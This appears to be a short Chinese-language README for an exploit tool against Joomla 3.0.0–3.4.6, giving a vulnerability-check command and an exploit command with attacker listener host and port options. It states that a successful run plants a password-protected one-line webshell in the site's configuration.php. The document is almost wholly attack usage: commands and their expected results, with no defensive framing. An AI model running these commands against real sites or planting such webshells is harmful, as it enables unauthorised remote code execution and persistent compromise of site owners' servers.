# Joomla-3.4.6---configuration.php-Remote-Code-Execution
影响范围：3.0.0-3.4.6
1、漏洞验证

python3 Joomla-3.4.6-RCE.py -t http://172.20.10.4

显示“Vulnerable”证明存在漏洞


python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121

执行成功

并在“configuration.php”写入随机密码的一句话木马

